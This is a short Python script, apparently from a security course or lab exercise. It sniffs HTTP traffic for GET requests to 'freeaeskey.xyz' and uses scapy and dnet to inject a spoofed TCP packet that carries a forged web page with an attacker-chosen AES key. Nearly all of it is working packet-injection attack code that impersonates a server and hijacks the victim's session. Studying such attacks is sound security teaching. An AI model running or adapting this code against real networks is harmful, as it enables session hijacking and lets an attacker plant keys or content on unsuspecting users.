from scapy.all import *

fake_page = '''HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Thu, 16 Mar 2017 04:01:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive\r\n
<html>
<head>
  <title>Free AES Key Generator!</title>
</head>
<body>
<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>
<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>
<br/>
<br/>
Your <i>free</i> AES-256 key: <b>49276d20737475636b20696e20616e20414553206b657920666163746f727921</b><br/>
</body>
</html>'''

def inject_pkt(pkt):
    import dnet
    dnet.ip().send(pkt)

def send_fake(pkt):
    tcp = TCP()
    tcp.sport = pkt[TCP].dport
    tcp.dport = pkt[TCP].sport
    tcp.seq = pkt[TCP].ack
    print len(pkt[Raw].load)
    tcp.ack = pkt[TCP].seq + len(pkt[Raw].load)
    tcp.dataofs = 8L
    tcp.flags = 'PA'
    tcp.window = 252
    tcp.urgptr = 0
    tcp.options = [('NOP', None), ('NOP', None), ('Timestamp', (pkt[TCP].options[2][1][1] + 100, pkt[TCP].options[2][1][0]))]

    ip = IP()
    ip.ihl = 5L
    ip.tos = 0
    ip.id = 924
    ip.flags = 'DF'
    ip.frag = 0
    ip.ttl = 47
    ip.proto = 'tcp'
    ip.src = pkt[IP].dst
    ip.dst = pkt[IP].src

    #eth = Ether()
    #eth.dst = pkt[Ether].src
    #eth.src = pkt[Ether].dst
    #eth.type = 0x800

    packet = str(ip/tcp/fake_page)

    print "--------------------------------"
    print "SENDING FAKE PACKET"
    print (ip/tcp/fake_page).show2()
    #print ':'.join(x.encode('hex') for x in packet)
    print "--------------------------------"
    inject_pkt(packet)

def intercept(pkt):
    http_packet = str(pkt)
    if http_packet.find('freeaeskey.xyz') > -1 and http_packet.find("GET") > -1:
        print "--------------------------------------"
        print "RECIEVED GET REQ"
        print pkt.show() 
        print "--------------------------------------"
        send_fake(pkt)

sniff(filter="tcp port 80", prn=intercept)
